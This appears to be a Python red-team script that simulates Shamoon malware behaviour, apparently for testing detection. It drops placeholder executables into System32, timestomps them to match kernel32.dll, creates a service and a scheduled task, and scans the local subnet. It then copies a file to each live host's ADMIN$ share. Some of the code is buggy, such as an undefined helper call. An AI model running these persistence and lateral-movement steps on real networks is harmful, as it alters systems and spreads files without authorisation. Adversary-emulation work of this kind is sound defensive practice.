# Shamoon Red team automation simulation
# Modules used:
# 1 - Service_Creation_module
# 2 - File_creation_Module
# 3 - Time_stamp_modification_Module
# 4 - DNS_Module
# 5 - Network_Communication_Module
# 6 - Shcedule_Task_Creation_Module
# 7 - Class_C_Scan_Module
# 8 - unusual_ms_tool_network Module
# Tasks completed:
# 1 - Create service trksvr.exe  - completed without changes
# 2 - Create file trksvr.exe - completed without changes
# 3 - change time stamp as kernel32.dll - completed without changes
# 4 - DNS to google - manully
# 5 - Network communication - completed without changes
# 6-  Schedule task - completed without changes
# 7 - scan and drop - manually created
# 8 - Process Injection - calc.exe, services.exe

# Total Time - 6.5 hours


import ctypes  #
import os
import shutil
import sys
# ==========Registry imports========
import time

import Class_C_Scan_Module as ScanC
import Shcedule_Task_Creation_Module as SchTask
import common


def error_decorator(f):
    '''
    This is a decorator function meant to decorate the errors of function objects.
    :param f: function object
    :return: the f function return statement or the error is raised
    '''

    def wrapper(*args, **kwargs):
        row = ''
        result = 0
        try:
            if args:
                result = f(*args, **kwargs)

            else:  # The function does not get any arguments
                result = f()

        except Exception as err:

            common.log("Error in %s --> Error code is %s" % (GetFunctionName(f), str(err)))

        finally:

            if type(result) is int and result is not 0:  # Operation failed to execute
                common.log("Error in %s --> Error code is %s" % (GetFunctionName(f), str(result)))

        return result

    return wrapper


def GetFunctionName(f):
    '''
    :param f: Function type
    :return: String rep of the function name
    '''

    return f.__name__


@error_decorator
def file_creation(TARGET_APP_NAME=None, TARGET_LOCATION=None):
    '''
    This function will create a new file in the Target path
    :param TARGET_APP_NAME: The name of the new file | String rep
    :param TARGET_LOCATION: The path to the new file | String rep
    '''

    filename = TARGET_LOCATION + "\\" + TARGET_APP_NAME
    os.system('echo "This file was create by shamoon" > ' + filename)

    return filename


@error_decorator
def time_stamp_mod(TARGET_FILE_LOCATION, TARGET_FILE_TO_COPY):
    '''
    mimick the time stamp of some file to the target file
    :param TARGET_FILE_LOCATION: the path to the file | String rep
    :param TARGET_FILE_TO_COPY: the path to the file | String rep
    '''

    modTime = os.path.getmtime(TARGET_FILE_TO_COPY)
    os.utime(TARGET_FILE_LOCATION, (modTime, modTime))


@error_decorator
def http_from_process(name, ip, port):
    '''
    Try to access the http server on given port
    :param name: path to http dir
    :param ip: local ip
    :param port: port to access the http server
    '''
    path = os.path.join(common.BASE_DIR, name)
    common.log("Making HTTP GET from %s" % path)
    shutil.copy(sys.executable, path)
    common.execute([path, "-c", "import urllib; urllib.urlopen('http://%s:%d')" % (ip, port)])
    # common.remove_file(path)


def main():
    if not os.path.exists(common.LOG_DIR):
        try:
            os.makedirs(common.LOG_DIR)  # Create C:\csvlog LOG_DIR
            row = [common.HOSTNAME, common.gettime(), 'Folder', 'C:\Shamoon', 'Created', 'Completed']
        except ImportError:
            row = [common.HOSTNAME, common.gettime(), 'Folder', 'C:\Shamoon', 'Created', 'Failed']
        common.logcsv(row)

    if not os.path.exists(common.BASE_DIR):
        try:
            os.makedirs(common.BASE_DIR)  # Create C:\Sahmoon BASE_DIR
            row = [common.HOSTNAME, common.gettime(), 'Folder', 'C:\Shamoon', 'Created', 'Completed']
        except ImportError:
            row = [common.HOSTNAME, common.gettime(), 'Folder', 'C:\Shamoon', 'Created', 'Failed']
        common.logcsv(row)

    # Loading the ws2_32.dll
    common.log("Loading ws2_32 DLL")
    time.sleep(2)
    hllDll = ctypes.WinDLL("C:\\windows\\system32\\ws2_32.dll")
    row = [common.HOSTNAME, common.gettime(), 'File', 'C:\Windows\system32\ws2_32.dll', 'Uptdated', 'Completed']
    common.logcsv(row)

    #######################################################
    # Create new files
    common.log("Creating files:")
    time.sleep(2)

    try:
        TrkSvrPath = file_creation('TrkSvr.exe', 'C:\\Windows\\System32')  # Create TrkSvr.exe
        common.log("TrkSvr.exe was created")
        row = [common.HOSTNAME, common.gettime(), 'File', 'C:\Windows\System32\TrkSvr.exe', 'Created', 'Completed']
    except Exception as err:
        common.log("Error in creating files - " + str(err))
        row = [common.HOSTNAME, common.gettime(), 'Task', 'Trksvr',
               'Updated', 'Failed']
    common.logcsv(row)

    time.sleep(2)
    try:
        DUIPath = file_creation('DUI170.dll', 'C:\\Windows\\System32')  # Create DUI170.dll
        common.log("DUI170.dll was created")
        row = [common.HOSTNAME, common.gettime(), 'File', 'C:\Windows\System32\DUI170.exe', 'Created', 'Completed']
    except Exception as err:
        common.log("Error in creating file DUI170 - " + str(err))
        row = [common.HOSTNAME, common.gettime(), 'File', 'C:\Windows\System32\DUI170.dll',
               'Updated', 'Failed']
    common.logcsv(row)

    time.sleep(2)
    try:
        CrssPath = file_creation('crss.exe', 'C:\\Windows\\System32')  # Create crss.exe
        row = [common.HOSTNAME, common.gettime(), 'File', 'C:\Windows\System32\crss.exe', 'Created', 'Completed']
        common.log("crss.exe was created")
    except Exception as err:
        common.log("Error in creating file DUI170 - " + str(err))
        row = [common.HOSTNAME, common.gettime(), 'File', 'C:\Windows\System32\'crss.exe',
               'Updated', 'Failed']
    common.logcsv(row)

    #########################################################
    # Change the time stamp
    try:
        common.log("Mimicking the time stamp of kernel32.dll")
        time.sleep(2)
        time_stamp_mod(TrkSvrPath, "C:\\Windows\\System32\\kernel32.dll")
        row = [common.HOSTNAME, common.gettime(), 'File', 'C:\Windows\System32\TrkSvr.exe', 'Updated', 'Completed']

    except Exception as err:
        common.log("Error in changing time stamp - " + str(err))
        row = [common.HOSTNAME, common.gettime(), 'File', 'C:\Windows\System32\TrkSvr.exe',
               'Updated', 'Failed']
    common.logcsv(row)

    #########################################################
    # Create new schedule task
    common.log("Creating new Schedule Task | TrkSvr")
    time.sleep(2)
    try:
        SchTask.main()
        common.log("Schedule Task --TrkSvr-- was successfully created")
        row = [common.HOSTNAME, common.gettime(), 'Task', 'Trksvr',
               'Created', 'Completed']

    except Exception as err:

        common.log("Error in creating schedule task - " + str(err))
        row = [common.HOSTNAME, common.gettime(), 'Task', 'Trksvr',
               'Updated', 'Failed']

    common.logcsv(row)

    ############################################################
    # System info
    common.log("Extracting the system information -> C:\Shamoon")
    try:
        os.system("systeminfo > C:\\Shamoon\\systeminfo.txt")
        row = [common.HOSTNAME, common.gettime(), 'File', common.BASE_DIR + "\\systeminfo.txt",
               'Created', 'Completed']

    except Exception as err:

        common.log("Error in creating system info file - " + str(err))
        row = [common.HOSTNAME, common.gettime(), 'File', common.BASE_DIR + "\\systeminfo.txt",
               'Created', 'Failed']

    common.logcsv(row)

    #############################################################
    # Cmd commands
    common.log("Running all the cmd commands: \n")
    time.sleep(1)
    commands = [
        "sc.exe create TrkSvr binPath= C:\\windows\\system32\\calc32.exe",
        "sc config lanmanworkstation start= demand"
    ]
    remote_host = "127.0.0.1"

    for command in commands:
        time.sleep(2)
        common.log(command + "\n")
        try:
            common.execute(command.format(host=remote_host))
            if "TrkSvr" in command:
                row = [common.HOSTNAME, common.gettime(), 'Service', "TrkSvr",
                       'Created', 'Completed']
            else:
                row = [common.HOSTNAME, common.gettime(), 'Service', "lanmanworkstation",
                       'Updated', 'Completed']

        except Exception as err:

            common.log("Error was raised in service manipulation: " + str(err))
            if "TrkSvr" in command:
                row = [common.HOSTNAME, common.gettime(), 'Service', "TrkSvr",
                       'Created', 'Completed']
            row = [common.HOSTNAME, common.gettime(), 'Service', "lanmanworkstation",
                   'Updated', 'Completed']

        common.logcsv(row)

    #################################################################
    # Network features: HTTP, DNS, Scan
    # unusual_ms_tool_network Module
    common.log("Trying to send http request to local network machines " \
               "on ports: 80, 3349, 445")

    ports = [80, 3349, 445]

    for port in ports:
        time.sleep(2)

        try:
            server, ip, portOpen = common.serve_web(port)  # HTTP req -- local http server
            process = "calc.exe"
            http_from_process(process, ip, portOpen)
            row = [common.HOSTNAME, common.gettime(), 'Port', str(port),
                   'Created', 'Completed']

        except Exception as err:
            common.log("Error " + str(err))
            row = [common.HOSTNAME, common.gettime(), 'Port', str(port),
                   'Created', 'Failed']

        common.logcsv(row)

    # DNS Module
    TargetSites = ["testdomain.com", "google.com"]
    for site in TargetSites:
        time.sleep(2)

        try:
            common.log("DNS to %s" % site)
            os.system("nslookup %s" % site)
            row = [common.HOSTNAME, common.gettime(), 'DNS', site,
                   'Created', 'Completed']
            common.log("DNS was successful")
            common.logcsv(row)
        except Exception as err:

            common.log("Error was raised in dns request to %s: %s" % (site, str(err)))
            row = [common.HOSTNAME, common.gettime(), 'DNS', site,
                   'Created', 'Failed']
            common.logcsv(row)

    # Network scan and file copy
    common.log("Trying to scan the network ")
    live_hosts = ScanC.main()
    common.log("Finished scanning the network. Trying to copy crss.exe to other live machines.")
    time.sleep(1)
    for host in live_hosts:

        try:
            dest = '\\\\' + str(host) + '\\ADMIN$'
            common.copy_file('C:\\Windows\\System32\\crss.exe', dest)
            common.log('trying to copy to ' + dest)
            row = [common.HOSTNAME, common.gettime(), 'Lateral Movement', "%s\\ADMIN$" % host,
                   'Created', 'Completed']


        except Exception as err:

            common.log("Error was raised in remote file copy to %s: %s" % (host, str(err)))
            row = [common.HOSTNAME, common.gettime(), 'Lateral Movement', "%s\\ADMIN$" % host,
                   'Created', 'Failed']

        common.logcsv(row)


# Checking prog arguments
os.system("mkdir C:\\Shamoon")
common.log('Checking script run arguments')
if len(sys.argv) < 2:
    common.log("No arguments were given on the run")
    if __name__ == "__main__":
        exit(main())
if sys.argv[1] == '1':
    common.log("Argmuent that was given is 1 -> running the script")
    if __name__ == "__main__":
        exit(main())

elif sys.argv[1] == '2':
    common.log("Argmuent that was given is 2 -> scanning the network")
    common.log("Trying to scan the network ")
    live_hosts = try_or_catch(ScanC.main)
    common.log("Finished scanning the network. Trying to copy crss.exe to other live machines.")
    time.sleep(1)
    for host in live_hosts:
        try:
            dest = '\\\\' + str(host) + '\\ADMIN$'
            common.copy_file('C:\\Windows\\System32\\crss.exe', dest)
            common.log('trying to copy to ' + dest)
            row = [common.HOSTNAME, common.gettime(), 'Lateral Movement', "%s\\ADMIN$" % host,
                   'Created', 'Completed']


        except Exception as err:

            common.log("Error was raised in remote file copy to %s: %s" % (host, str(err)))
            row = [common.HOSTNAME, common.gettime(), 'Lateral Movement', "%s\\ADMIN$" % host,
                   'Created', 'Failed']

        common.logcsv(row)
